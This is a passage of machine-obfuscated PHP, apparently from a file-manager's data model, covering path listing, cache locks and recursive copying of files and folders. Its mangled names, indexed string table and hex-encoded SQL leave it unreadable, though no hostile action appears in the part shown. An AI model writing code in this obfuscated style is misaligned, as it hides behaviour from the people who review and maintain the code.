$üêÄ‡ñœ[$ñÂıúÌ¸[432]] == 0 && !isset($¹ÜÓÑïù[$÷İÊâµ])) { $¹ÜÓÑïù[$÷İÊâµ] = $this->_listAppendPathRoot($üêÄ‡ñœ, array()); } if (isset($á öíĞì[$üêÄ‡ñœ[$ñÂıúÌ¸[521]]])) { continue; } $á öíĞì[$üêÄ‡ñœ[$ñÂıúÌ¸[521]]] = !0; $ÛÛçÛÀ = $this->parentLevelArray($üêÄ‡ñœ[$ñÂıúÌ¸[521]]); foreach ($ÛÛçÛÀ as $úèÃ’ÆÅ => $¦æüåÍâ) { if (isset($¹ÜÓÑïù[$¦æüåÍâ])) { continue; } if ($úèÃ’ÆÅ == 0) { $¹ÜÓÑïù[$¦æüåÍâ] = $this->_listAppendPathRoot($üêÄ‡ñœ, $ÛÛçÛÀ); } if ($úèÃ’ÆÅ != 0) { $¦µåŞà[] = $¦æüåÍâ; } } } unset($üêÄ‡ñœ); $¦µåŞà = array_unique($¦µåŞà); if (count($¦µåŞà) > 0) { $á—Æ—šğ = array($ñÂıúÌ¸[417] => array($ñÂıúÌ¸[418], $¦µåŞà)); if (count($¦µåŞà) == 1) { $–şÒ²ìÄ = $this->sourceInfo($¦µåŞà[0]); $Ú×‚ò¾¿ = is_array($–şÒ²ìÄ) ? array($–şÒ²ìÄ) : !1; } else { $Ú×‚ò¾¿ = $this->field($ñÂıúÌ¸[528])->where($á—Æ—šğ)->select(); } if (!$Ú×‚ò¾¿) { $Ú×‚ò¾¿ = array(); } foreach ($Ú×‚ò¾¿ as $²±‹§¡¶) { $¹ÜÓÑïù[$²±‹§¡¶[$ñÂıúÌ¸[402]]] = $²±‹§¡¶[$ñÂıúÌ¸[32]]; } } $ÊòÓÏíø = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $È¬Ñü÷ = array(); foreach ($¦Ì½åËå as &$üêÄ‡ñœ) { $µ‹ø¦÷ = $üêÄ‡ñœ[$ñÂıúÌ¸[521]]; $ÜîÂùµ† = $ñÂıúÌ¸[12]; if (isset($È¬Ñü÷[$µ‹ø¦÷])) { $ÜîÂùµ† = $È¬Ñü÷[$µ‹ø¦÷]; } else { $ÛÛçÛÀ = $this->parentLevelArray($üêÄ‡ñœ[$ñÂıúÌ¸[521]]); foreach ($ÛÛçÛÀ as $úèÃ’ÆÅ => $¦æüåÍâ) { if (isset($¹ÜÓÑïù[$¦æüåÍâ])) { $ÜîÂùµ† .= $¹ÜÓÑïù[$¦æüåÍâ] . $ñÂıúÌ¸[8]; } } $È¬Ñü÷[$µ‹ø¦÷] = $ÜîÂùµ†; } $ÜîÂùµ† .= $üêÄ‡ñœ[$ñÂıúÌ¸[32]]; if ($üêÄ‡ñœ[$ñÂıúÌ¸[410]] == $ñÂıúÌ¸[88]) { $ÜîÂùµ† .= $ñÂıúÌ¸[8]; } $üêÄ‡ñœ[$ñÂıúÌ¸[519]] = str_replace($ñÂıúÌ¸[529], $ñÂıúÌ¸[8], $ÜîÂùµ†); if ($üêÄ‡ñœ[$ñÂıúÌ¸[432]] == $ñÂıúÌ¸[197]) { $üêÄ‡ñœ[$ñÂıúÌ¸[32]] = trim($¹ÜÓÑïù[$üêÄ‡ñœ[$ñÂıúÌ¸[402]]], $ñÂıúÌ¸[8]); $üêÄ‡ñœ[$ñÂıúÌ¸[519]] = $üêÄ‡ñœ[$ñÂıúÌ¸[32]] . $ñÂıúÌ¸[8]; } if (intval($üêÄ‡ñœ[$ñÂıúÌ¸[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($üêÄ‡ñœ, $ÛÛçÛÀ, $ÊòÓÏíø); } } unset($üêÄ‡ñœ); return $¦Ì½åËå; } private function _listAppendPathRecycle(&$ÕÍˆŠÎÊ, $ÔòìÔÚ, $¶ìôÔì) { $¢…Ãèõ÷ =& $_SERVER[ñˆ‹ß¿÷]; if (!in_array($¶ìôÔì, $ÔòìÔÚ) && $ÕÍˆŠÎÊ[$¢…Ãèõ÷[402]] != $¶ìôÔì) { return; } $š²Õ³¡ƒ = explode($¢…Ãèõ÷[8], trim($ÕÍˆŠÎÊ[$¢…Ãèõ÷[519]], $¢…Ãèõ÷[8])); $ÓÀŞ®˜· = implode($¢…Ãèõ÷[8], array_slice($š²Õ³¡ƒ, 2)); $ÕÍˆŠÎÊ[$¢…Ãèõ÷[519]] = $¢…Ãèõ÷[8] . LNG($¢…Ãèõ÷[530]) . $¢…Ãèõ÷[8] . ltrim($ÓÀŞ®˜·, $¢…Ãèõ÷[8]); $ÕÍˆŠÎÊ[$¢…Ãèõ÷[521]] = $¢…Ãèõ÷[531] . implode($¢…Ãèõ÷[50], array_slice($ÔòìÔÚ, 1)) . $¢…Ãèõ÷[50]; if ($ÕÍˆŠÎÊ[$¢…Ãèõ÷[402]] == $¶ìôÔì) { $ÕÍˆŠÎÊ[$¢…Ãèõ÷[521]] = $¢…Ãèõ÷[531]; $ÕÍˆŠÎÊ[$¢…Ãèõ÷[432]] = $¢…Ãèõ÷[197]; $ÕÍˆŠÎÊ[$¢…Ãèõ÷[32]] = LNG($¢…Ãèõ÷[530]); } $ÕÍˆŠÎÊ[$¢…Ãèõ÷[532]] = $¢…Ãèõ÷[533]; } protected function _listAppendPathRoot(&$Ó˜ø¿„¡, $Ñ¨ıô»ª) { $»’ú“†ó =& $_SERVER[ñˆ‹ß¿÷]; static $Œëµ¹°Å = false; $…îƒ´ºŞ = $»’ú“†ó[12]; if ($Ó˜ø¿„¡[$»’ú“†ó[411]] == self::TYPE_USER) { if (defined($»’ú“†ó[475]) && $Ó˜ø¿„¡[$»’ú“†ó[505]] == USER_ID) { $…îƒ´ºŞ = LNG($»’ú“†ó[534]); if ($Œëµ¹°Å === !1) { $‘‡ã°İ = Model($»’ú“†ó[535])->getInfoFull(USER_ID); $Œëµ¹°Å = _get($‘‡ã°İ, $»’ú“†ó[536], $»’ú“†ó[12]); } if ($Ñ¨ıô»ª && $Ñ¨ıô»ª[0] == $Œëµ¹°Å || !$Ñ¨ıô»ª && $Ó˜ø¿„¡[$»’ú“†ó[402]] == $Œëµ¹°Å) { $…îƒ´ºŞ = LNG($»’ú“†ó[537]); $Ó˜ø¿„¡[$»’ú“†ó[538]] = $»’ú“†ó[539]; } if (!$Ñ¨ıô»ª) { $Ó˜ø¿„¡[$»’ú“†ó[32]] = $…îƒ´ºŞ; } } else { $êŠÈÎ = Model($»’ú“†ó[513])->getInfoSimple($Ó˜ø¿„¡[$»’ú“†ó[505]]); $…îƒ´ºŞ = LNG($»’ú“†ó[540]) . $»’ú“†ó[162] . $êŠÈÎ[$»’ú“†ó[32]] . $»’ú“†ó[164]; $Ó˜ø¿„¡[$»’ú“†ó[541]] = array($»’ú“†ó[32] => $êŠÈÎ[$»’ú“†ó[32]], $»’ú“†ó[542] => $êŠÈÎ[$»’ú“†ó[542]], $»’ú“†ó[543] => $êŠÈÎ[$»’ú“†ó[543]]); } } else { if ($Ó˜ø¿„¡[$»’ú“†ó[411]] == self::TYPE_GROUP) { $êŠÈÎ = Model($»’ú“†ó[522])->getInfoSimple($Ó˜ø¿„¡[$»’ú“†ó[505]]); $…îƒ´ºŞ = $êŠÈÎ[$»’ú“†ó[32]]; } else { if ($Ó˜ø¿„¡[$»’ú“†ó[411]] == self::TYPE_SYSTEM) { $…îƒ´ºŞ = $»’ú“†ó[544]; } } } $…îƒ´ºŞ = $…îƒ´ºŞ ? $»’ú“†ó[8] . $…îƒ´ºŞ . $»’ú“†ó[8] : $»’ú“†ó[8]; return $…îƒ´ºŞ; } protected function _listAppendUser(&$ÑäÙ·Ö¯) { $ÎçŒšøÓ =& $_SERVER[ñˆ‹ß¿÷]; $ÓÀ°Ùô¬ = array_to_keyvalue($ÑäÙ·Ö¯, $ÎçŒšøÓ[12], $ÎçŒšøÓ[454]); $èâ¿é¥‘ = array_to_keyvalue($ÑäÙ·Ö¯, $ÎçŒšøÓ[12], $ÎçŒšøÓ[456]); $‡„úèü÷ = array_merge($ÓÀ°Ùô¬, $èâ¿é¥‘); $ªÕÙö¾è = Model($ÎçŒšøÓ[535])->userListInfo($‡„úèü÷); foreach ($ÑäÙ·Ö¯ as &$úÁÏ×˜Õ) { $•å§¶éÖ = $úÁÏ×˜Õ[$ÎçŒšøÓ[454]]; $úÁÏ×˜Õ[$ÎçŒšøÓ[454]] = $ªÕÙö¾è[$•å§¶éÖ] ? $ªÕÙö¾è[$•å§¶éÖ] : !1; $•å§¶éÖ = $úÁÏ×˜Õ[$ÎçŒšøÓ[456]]; $úÁÏ×˜Õ[$ÎçŒšøÓ[456]] = $ªÕÙö¾è[$•å§¶éÖ] ? $ªÕÙö¾è[$•å§¶éÖ] : !1; if (isset($úÁÏ×˜Õ[$ÎçŒšøÓ[466]]) && $úÁÏ×˜Õ[$ÎçŒšøÓ[466]][$ÎçŒšøÓ[545]]) { $Ù¢™„¦¸ = $GLOBALS[$ÎçŒšøÓ[6]][$ÎçŒšøÓ[89]][$ÎçŒšøÓ[546]]; if ($úÁÏ×˜Õ[$ÎçŒšøÓ[466]][$ÎçŒšøÓ[547]] <= time() - $Ù¢™„¦¸) { $this->metaSet($úÁÏ×˜Õ[$ÎçŒšøÓ[402]], $ÎçŒšøÓ[545], null); $this->metaSet($úÁÏ×˜Õ[$ÎçŒšøÓ[402]], $ÎçŒšøÓ[547], null); unset($úÁÏ×˜Õ[$ÎçŒšøÓ[466]][$ÎçŒšøÓ[545]]); continue; } $Øëá¹¶¥ = $úÁÏ×˜Õ[$ÎçŒšøÓ[466]][$ÎçŒšøÓ[545]]; $úÁÏ×˜Õ[$ÎçŒšøÓ[466]][$ÎçŒšøÓ[548]] = Model($ÎçŒšøÓ[535])->getInfoSimpleOuter($Øëá¹¶¥); } } unset($úÁÏ×˜Õ); } public function parentLevelArray($ıËÎœ²Œ) { $µşƒ·ÙÁ =& $_SERVER[ñˆ‹ß¿÷]; $ıËÎœ²Œ = explode($µşƒ·ÙÁ[50], trim($ıËÎœ²Œ, $µşƒ·ÙÁ[50])); return array_remove_value($ıËÎœ²Œ, $µşƒ·ÙÁ[197]); } public function listAll($ÔÁŠĞ™) { $¤‹áê±à =& $_SERVER[ñˆ‹ß¿÷]; $ÕĞ©³„ = $this->sourceInfo($ÔÁŠĞ™); $¯×ïóæ‡ = array($¤‹áê±à[549] => array($¤‹áê±à[550], $ÕĞ©³„[$¤‹áê±à[521]] . $ÔÁŠĞ™ . $¤‹áê±à[551]), $¤‹áê±à[552] => 0); $®Ïıİ» = $¤‹áê±à[553]; $û«éï¶Ş = "\x4c\105\106\124\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\151\157\137\146\x69\154\x65\x20\146\151\154\145\x20\x6f\x6e\x20\x73\157\x75\162\143\145\x2e\x66\x69\x6c\x65\x49\104\40\75\x20\x66\151\x6c\145\56\x66\151\154\x65\x49\104"; $™À†û… = $this->alias($¤‹áê±à[446])->field($®Ïıİ»)->where($¯×ïóæ‡)->join($û«éï¶Ş)->select(); $this->_listAppendAuth($™À†û…); $this->_listAppendUser($™À†û…); $this->_listAppendPath($™À†û…); $™À†û… = array_to_keyvalue($™À†û…, $¤‹áê±à[402]); $Ù£Š³‚˜ = "\57{$ÕĞ©³„[$¤‹áê±à[32]]}\x2f"; $Ù£Š³‚˜ = $Ù£Š³‚˜ == $¤‹áê±à[529] ? $¤‹áê±à[8] : $Ù£Š³‚˜; $“²ÓÙ ‡ = array(); foreach ($™À†û… as $Î½ÑÒïÃ => $ŞÜÜœ¤„) { $ôøÍ¶ãü = $this->parentLevelArray($ŞÜÜœ¤„[$¤‹áê±à[521]]); array_shift($ôøÍ¶ãü); $ë®¿Ëğ = $Ù£Š³‚˜; for ($üÊÂÎÚ² = 0; $üÊÂÎÚ² < count($ôøÍ¶ãü); $üÊÂÎÚ²++) { $ë®¿Ëğ .= $™À†û…[$ôøÍ¶ãü[$üÊÂÎÚ²]][$¤‹áê±à[32]] . $¤‹áê±à[8]; } $ë®¿Ëğ .= $ŞÜÜœ¤„[$¤‹áê±à[32]]; if ($ŞÜÜœ¤„[$¤‹áê±à[410]]) { $ë®¿Ëğ .= $¤‹áê±à[8]; } $ë®¿Ëğ = str_replace($¤‹áê±à[529], $¤‹áê±à[8], $ë®¿Ëğ); $ë®¿Ëğ = str_replace($¤‹áê±à[529], $¤‹áê±à[8], $ë®¿Ëğ); $éôïÖÀ‘ = array($¤‹áê±à[421] => str_replace($¤‹áê±à[529], $¤‹áê±à[8], $ë®¿Ëğ), $¤‹áê±à[554] => intval($ŞÜÜœ¤„[$¤‹áê±à[410]]), $¤‹áê±à[86] => $this->pathInfoFilter($ŞÜÜœ¤„)); if (!$ŞÜÜœ¤„[$¤‹áê±à[410]]) { $éôïÖÀ‘[$¤‹áê±à[468]] = $ŞÜÜœ¤„[$¤‹áê±à[468]]; $éôïÖÀ‘[$¤‹áê±à[87]] = $ŞÜÜœ¤„[$¤‹áê±à[84]]; } $“²ÓÙ ‡[] = $éôïÖÀ‘; } return $“²ÓÙ ‡; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($éêçŠñÊ) { $—ƒªğÚ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($—ƒªğÚ[555], $éêçŠñÊ); $¸ÃäÆå‹ = 1; $this->_lockEvent($éêçŠñÊ, array($—ƒªğÚ[556], $—ƒªğÚ[557]), $¸ÃäÆå‹); $this->_lockParent($éêçŠñÊ, array($—ƒªğÚ[557]), $¸ÃäÆå‹); $this->_lockEvent($éêçŠñÊ, array($—ƒªğÚ[558], $—ƒªğÚ[559]), $¸ÃäÆå‹); $this->_lockCheckEnd($—ƒªğÚ[555], $éêçŠñÊ); } public function lockCopyEnd($¾š¾›ğ¹) { $ÜôóŠ‘ƒ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->allowLock()) { return; } $¤ë¦÷¯Á = 0; $this->_lockEvent($¾š¾›ğ¹, array($ÜôóŠ‘ƒ[556], $ÜôóŠ‘ƒ[557]), $¤ë¦÷¯Á); $this->_lockParent($¾š¾›ğ¹, array($ÜôóŠ‘ƒ[557]), $¤ë¦÷¯Á); $this->_lockEvent($¾š¾›ğ¹, array($ÜôóŠ‘ƒ[558], $ÜôóŠ‘ƒ[559]), $¤ë¦÷¯Á); } public function lockWriteStart($Ù¹­©, $³àÄ¿¡ñ = '') { $±åá—Ù· =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($±åá—Ù·[556], $Ù¹­©); $£¬÷®Òö = 1; $this->_lockKey($±åá—Ù·[560] . $Ù¹­© . $±åá—Ù·[10] . $³àÄ¿¡ñ, $£¬÷®Òö); $this->_lockEvent($Ù¹­©, array($±åá—Ù·[555], $±åá—Ù·[557]), $£¬÷®Òö); $this->_lockParent($Ù¹­©, array($±åá—Ù·[555], $±åá—Ù·[557]), $£¬÷®Òö); $this->_lockCheckEnd($±åá—Ù·[556], $Ù¹­©); } public function lockWriteEnd($¹¿‡è, $ÜÏïˆ÷¨ = '') { $ÆóëãŠ® =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->allowLock()) { return; } $ôğÊüìš = 0; $this->_lockKey($ÆóëãŠ®[560] . $¹¿‡è . $ÆóëãŠ®[10] . $ÜÏïˆ÷¨, $ôğÊüìš); $this->_lockEvent($¹¿‡è, array($ÆóëãŠ®[555], $ÆóëãŠ®[557]), $ôğÊüìš); $this->_lockParent($¹¿‡è, array($ÆóëãŠ®[555], $ÆóëãŠ®[557]), $ôğÊüìš); } public function lockMoveStart($¨ú°™) { $îª‰˜öì =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($îª‰˜öì[557], $¨ú°™); $§û¦û¦Ú = 1; $this->_lockKey($îª‰˜öì[561] . $¨ú°™, $§û¦û¦Ú); $this->_lockEvent($¨ú°™, array($îª‰˜öì[555], $îª‰˜öì[556]), $§û¦û¦Ú); $this->_lockParent($¨ú°™, array($îª‰˜öì[555], $îª‰˜öì[557]), $§û¦û¦Ú); $this->_lockEvent($¨ú°™, array($îª‰˜öì[562], $îª‰˜öì[558], $îª‰˜öì[559]), $§û¦û¦Ú); $this->_lockCheckEnd($îª‰˜öì[557], $¨ú°™); } public function lockMoveEnd($³¢¢öÌ®) { $ÆÂ¿ŸÀĞ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->allowLock()) { return; } $™¶‚¤”ş = 0; $this->_lockKey($ÆÂ¿ŸÀĞ[561] . $³¢¢öÌ®, $™¶‚¤”ş); $this->_lockEvent($³¢¢öÌ®, array($ÆÂ¿ŸÀĞ[555], $ÆÂ¿ŸÀĞ[556]), $™¶‚¤”ş); $this->_lockParent($³¢¢öÌ®, array($ÆÂ¿ŸÀĞ[555], $ÆÂ¿ŸÀĞ[557]), $™¶‚¤”ş); $this->_lockEvent($³¢¢öÌ®, array($ÆÂ¿ŸÀĞ[562], $ÆÂ¿ŸÀĞ[558], $ÆÂ¿ŸÀĞ[559]), $™¶‚¤”ş); } private function _lockCheck($üûŠ©Èş, $µ¢ı¯Á) { $Ü’ƒãèô =& $_SERVER[ñˆ‹ß¿÷]; $Öš¾ùÑ” = $this->sourceInfo($µ¢ı¯Á); $ºñ€•éÖ = $üûŠ©Èş . $Ü’ƒãèô[10] . $µ¢ı¯Á; $this->_lockTimeStart[$ºñ€•éÖ] = timeFloat(); if (!is_array($Öš¾ùÑ”)) { return; } $¿Ë¾®Ş‚ = LNG($Ü’ƒãèô[563]); CacheLock::setErrorMsg($Ü’ƒãèô[162] . htmlspecialchars($Öš¾ùÑ”[$Ü’ƒãèô[32]]) . $Ü’ƒãèô[164] . $¿Ë¾®Ş‚); $this->_lockKey($ºñ€•éÖ, 1); $this->_lockKey($ºñ€•éÖ, 0); $»ëùçÂ = array_reverse($this->parentLevelArray($Öš¾ùÑ”[$Ü’ƒãèô[521]])); foreach ($»ëùçÂ as $Õëø—°‚) { $ºñ€•éÖ = $üûŠ©Èş . $Ü’ƒãèô[564] . $Õëø—°‚; if (CacheLock::lockGet($Ü’ƒãèô[565] . $ºñ€•éÖ)) { $Öš¾ùÑ” = $this->sourceInfo($Õëø—°‚); CacheLock::setErrorMsg($Ü’ƒãèô[162] . htmlspecialchars($Öš¾ùÑ”[$Ü’ƒãèô[32]]) . $Ü’ƒãèô[164] . $¿Ë¾®Ş‚); $this->_lockKey($ºñ€•éÖ, 1); $this->_lockKey($ºñ€•éÖ, 0); } } } private function _lockCheckEnd($íİñ¯Ôš, $êô·Œ×ï) { $Õ´šÔÎä =& $_SERVER[ñˆ‹ß¿÷]; $ÜÑÀÛ® = $íİñ¯Ôš . $Õ´šÔÎä[10] . $êô·Œ×ï; CacheLock::setErrorMsg($Õ´šÔÎä[378]); if (!isset($this->_lockTimeStart[$ÜÑÀÛ®])) { return; } $„ş·ò„ = timeFloat() - $this->_lockTimeStart[$ÜÑÀÛ®]; unset($this->_lockTimeStart[$ÜÑÀÛ®]); if ($„ş·ò„ > 0.5) { unset(self::$cacheSourceInfo[$Õ´šÔÎä[460] . $êô·Œ×ï]); } $‹Ô‹«Ìµ = $this->sourceInfo($êô·Œ×ï); if (!$‹Ô‹«Ìµ) { show_json(LNG($Õ´šÔÎä[105]), !1); } } private function _lockParent($Î‘ëªÕ, $ Úğ²ĞÎ, $­Ìç”„ü) { if (!$this->autoLockSet) { return; } $ˆºÉ†Â€ = $this->sourceInfo($Î‘ëªÕ); if (!is_array($ˆºÉ†Â€)) { return; } $¯øœÚê = array_reverse($this->parentLevelArray($ˆºÉ†Â€[$_SERVER[ñˆ‹ß¿÷][521]])); foreach ($¯øœÚê as $ù¶®œÀ) { $this->_lockEvent($ù¶®œÀ, $ Úğ²ĞÎ, $­Ìç”„ü); } } private function _lockEvent($ĞººÑ©Á, $å¯§¨ø, $Âœ¼‚ªÇ) { $•³—› =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->autoLockSet) { return; } foreach ($å¯§¨ø as $³áÑÚªÎ) { $Ö²ù¥²õ = $³áÑÚªÎ . $•³—›[10] . $ĞººÑ©Á; if ($Âœ¼‚ªÇ && CacheLock::lockGet($•³—›[565] . $Ö²ù¥²õ)) { continue; } $this->_lockKey($Ö²ù¥²õ, $Âœ¼‚ªÇ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¶ùŒÄ¾Ü, $Ãè¼¶ê° = 1) { $İ±ÛĞÌ = $_SERVER[ñˆ‹ß¿÷][565] . md5($¶ùŒÄ¾Ü); if ($Ãè¼¶ê°) { if (isset(self::$_lockItemArr[$İ±ÛĞÌ])) { return; } self::$_lockItemArr[$İ±ÛĞÌ] = 1; CacheLock::lock($İ±ÛĞÌ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$İ±ÛĞÌ])) { return; } unset(self::$_lockItemArr[$İ±ÛĞÌ]); CacheLock::unlock($İ±ÛĞÌ); } } public function isParentOf($¢¶œ¢ê÷, $¶Ş©µ˜¿) { $Öôü¯Ã™ =& $_SERVER[ñˆ‹ß¿÷]; $ÁÖÎ¥œ = $this->sourceInfo($¢¶œ¢ê÷); $ñ´ì±»Ø = $this->sourceInfo($¶Ş©µ˜¿); $˜–îÊ› = $ÁÖÎ¥œ[$Öôü¯Ã™[521]] . $ÁÖÎ¥œ[$Öôü¯Ã™[402]] . $Öôü¯Ã™[50]; $÷Æä²€‚ = $ñ´ì±»Ø[$Öôü¯Ã™[521]] . $ñ´ì±»Ø[$Öôü¯Ã™[402]] . $Öôü¯Ã™[50]; $ßÜÊ»™â = strpos($÷Æä²€‚, $˜–îÊ›) === 0; return $ßÜÊ»™â; } private $targetIsDelete = 0; public function copy($‰üµ£«Å, $·ƒÌª‰–, $˜Êğù Ù = REPEAT_REPLACE, $íö¼Âï¯ = '') { $âÖ™¸ÒÕ =& $_SERVER[ñˆ‹ß¿÷]; $Ã±ÒÇï = $this->sourceInfo($‰üµ£«Å); $Í‡ˆÀ¨º = $this->sourceInfo($·ƒÌª‰–); if (!$Ã±ÒÇï || !$Í‡ˆÀ¨º || $Í‡ˆÀ¨º[$âÖ™¸ÒÕ[410]] != $âÖ™¸ÒÕ[88]) { return !1; } if ($this->isParentOf($‰üµ£«Å, $·ƒÌª‰–)) { return !1; } $ÇÃêÙùà = $íö¼Âï¯ ? $íö¼Âï¯ : $Ã±ÒÇï[$âÖ™¸ÒÕ[32]]; $this->lockCopyStart($‰üµ£«Å); $this->lockWriteStart($·ƒÌª‰–, $ÇÃêÙùà); $âÒï°†Š = array($âÖ™¸ÒÕ[566] => array(), $âÖ™¸ÒÕ[567] => array(), $âÖ™¸ÒÕ[568] => array()); $this->targetIsDelete = intval($Ã±ÒÇï[$âÖ™¸ÒÕ[431]]); $Ğ»Á‡ú = $this->fileNameExistCache($·ƒÌª‰–, $Ã±ÒÇï[$âÖ™¸ÒÕ[32]]); $³â©ˆ¥ = $this->_copy($‰üµ£«Å, $·ƒÌª‰–, $˜Êğù Ù, $âÒï°†Š, !0, $íö¼Âï¯); $this->_childrenListClear(); $this->lockCopyEnd($‰üµ£«Å); $this->lockWriteEnd($·ƒÌª‰–, $ÇÃêÙùà); if ($Ã±ÒÇï[$âÖ™¸ÒÕ[410]] == $âÖ™¸ÒÕ[88] && $Ğ»Á‡ú == $³â©ˆ¥) { $this->folderSizeResetChildren($Ğ»Á‡ú); } Model($âÖ™¸ÒÕ[569])->addAll($âÒï°†Š[$âÖ™¸ÒÕ[567]], array(), !0); if ($Ğ»Á‡ú != $³â©ˆ¥ || $Ã±ÒÇï[$âÖ™¸ÒÕ[410]] == $âÖ™¸ÒÕ[88]) { Model($âÖ™¸ÒÕ[570])->eventCopy($³â©ˆ¥); } $this->saveAll($âÒï°†Š[$âÖ™¸ÒÕ[568]]); Model($âÖ™¸ÒÕ[199])->linkAdd($âÒï°†Š[$âÖ™¸ÒÕ[566]]); $this->folderSizeReset($·ƒÌª‰–); $this->updateModifyTime($·ƒÌª‰–); return $³â©ˆ¥; } private function _copy($„£Âß³, $óÖêŞü£, $ÓÚœ‰«£, &$Ì»¨óãâ, $ìÑ¦Íç, $Ğ‚®–­· = '') { $ªßäØæÍ =& $_SERVER[ñˆ‹ß¿÷]; $ñœ²Îş’ = $this->sourceInfoCache($„£Âß³); $ª´Ó£– = $ñœ²Îş’[$ªßäØæÍ[410]] == $ªßäØæÍ[88]; $¨éÃê²ø = $Ğ‚®–­· ? $Ğ‚®–­· : $ñœ²Îş’[$ªßäØæÍ[32]]; $¥ëËó³â = $this->fileNameExistCache($óÖêŞü£, $¨éÃê²ø); if ($ìÑ¦Íç) { $this->_childrenAllMake($„£Âß³); if ($ª´Ó£– && $¥ëËó³â) { $this->_childrenAllMake($¥ëËó³â); } } if (!$¥ëËó³â) { return $this->_copyCreate($„£Âß³, $óÖêŞü£, $¨éÃê²ø, $Ì»¨óãâ); } $ÌßåõƒÓ = $¥ëËó³â; if ($ª´Ó£–) { if ($ÓÚœ‰«£ == REPEAT_RENAME_FOLDER) { $¨éÃê²ø = $this->fileNameAutoCache($óÖêŞü£, $¨éÃê²ø, $ÓÚœ‰«£, $ª´Ó£–); $ÌßåõƒÓ = $this->_copyCreate($„£Âß³, $óÖêŞü£, $¨éÃê²ø, $Ì»¨óãâ); } else { $”Ğ¶áÖ = $this->_childrenList($„£Âß³); foreach ($”Ğ¶áÖ as $¬ŒÚü“ª) { $this->_copy($¬ŒÚü“ª[$ªßäØæÍ[402]], $¥ëËó³â, $ÓÚœ‰«£, $Ì»¨óãâ, !1); } } } else { if ($ÓÚœ‰«£ == REPEAT_RENAME || $ÓÚœ‰«£ == REPEAT_RENAME_FOLDER) { $¨éÃê²ø = $this->fileNameAutoCache($óÖêŞü£, $¨éÃê²ø, $ÓÚœ‰«£, $ª´Ó£–); $ÌßåõƒÓ = $this->_copyCreate($„£Âß³, $óÖêŞü£, $¨éÃê²ø, $Ì»¨óãâ); } else { if ($ÓÚœ‰«£ == REPEAT_REPLACE) { $ƒı¥à‹ê = $this->sourceInfoCache($¥ëËó³â); $£â‹‰é = $this->fileHistory($ƒı¥à‹ê, $ñœ²Îş’[$ªßäØæÍ[468]], $ñœ²Îş’[$ªßäØæÍ[76]]); if ($£â‹‰é) { $Ì»¨óãâ[$ªßäØæÍ[566]][] = $ñœ²Îş’[$ªßäØæÍ[468]]; } } else { if ($ÓÚœ‰«£ == REPEAT_SKIP) { } } } Hook::trigger($ªßäØæÍ[571], array($ªßäØæÍ[572], $ñœ²Îş’, 0)); } return $ÌßåõƒÓ; } private function _copyCreate($€Õ‹ª¸», $îš¶ö, $õÁô³†Â, &$Âõç¸Ôá) { $®µÂ£ñÊ =& $_SERVER[ñˆ‹ß¿÷]; $ÎÜıøÌú = $this->sourceInfoCache($€Õ‹ª¸»); $ëõ“”ÂÅ = $this->sourceInfoCache($îš¶ö); $¥Ÿœ´¢Á = $this->_makeItemData($ÎÜıøÌú, $ëõ“”ÂÅ, $õÁô³†Â); Hook::trigger($®µÂ£ñÊ[573], $¥Ÿœ´¢Á); Hook::trigger($®µÂ£ñÊ[574], array($®µÂ£ñÊ[575], $¥Ÿœ´¢Á, 0)); $æºù§Òø = $this->add($¥Ÿœ´¢Á); $‡ã‰šœê = array($®µÂ£ñÊ[402] => $æºù§Òø, $®µÂ£ñÊ[32] => $õÁô³†Â); $this->_copyApplyMeta($‡ã‰šœê, $Âõç¸Ôá); if ($ÎÜıøÌú[$®µÂ£ñÊ[410]] != $®µÂ£ñÊ[88]) { $Âõç¸Ôá[$®µÂ£ñÊ[566]][] = $ÎÜıøÌú[$®µÂ£ñÊ[468]]; return $æºù§Òø; } $£·Õ¹„· = array(); $•’¨¢ò¦ = array(); $this->_childrenListAll($€Õ‹ª¸», $£·Õ¹„·); $›œ˜¦ıÊ = count($£·Õ¹„·); if ($›œ˜¦ıÊ == 0) { return $æºù§Òø; } $§©€îšä = $this->sourceInfo($æºù§Òø); foreach ($£·Õ¹„· as $ŞšàÍ·») { $™¸˜È™Ô = $this->_makeItemData($ŞšàÍ·», $§©€îšä, $ŞšàÍ·»[$®µÂ£ñÊ[32]]); $™¸˜È™Ô[$®µÂ£ñÊ[521]] = $ŞšàÍ·»[$®µÂ£ñÊ[521]]; $•’¨¢ò¦[] = $™¸˜È™Ô; } $this->chunkEventSet($®µÂ£ñÊ[576], array($®µÂ£ñÊ[577], $¥Ÿœ´¢Á, $›œ˜¦ıÊ)); $this->addAll($•’¨¢ò¦, array(), !1); $¶¢ ‰± = $this->where(array($®µÂ£ñÊ[432] => $æºù§Òø))->select(); $ªÜ¥Œ¯Á = $this->_childrenMakeRelation($£·Õ¹„·, $¶¢ ‰±); $ªÜ¥Œ¯Á[$€Õ‹ª¸»] = $æºù§Òø; $á«ÇƒäÁ = array(); $í–™½—— = array(); foreach ($¶¢ ‰± as $ŞšàÍ·») { $¢˜ä¤Š¬ = $ŞšàÍ·»[$®µÂ£ñÊ[402]]; $À­ÇßŠâ = $this->_childrenMatch($ªÜ¥Œ¯Á, $ŞšàÍ·», $§©€îšä); $á«ÇƒäÁ[] = array($®µÂ£ñÊ[402], $¢˜ä¤Š¬, $®µÂ£ñÊ[432], $À­ÇßŠâ[$®µÂ£ñÊ[432]]); $í–™½——[] = array($®µÂ£ñÊ[402], $¢˜ä¤Š¬, $®µÂ£ñÊ[521], $À­ÇßŠâ[$®µÂ£ñÊ[521]]); $this->_copyApplyMeta($ŞšàÍ·», $Âõç¸Ôá); if ($ŞšàÍ·»[$®µÂ£ñÊ[410]] != $®µÂ£ñÊ[88]) { 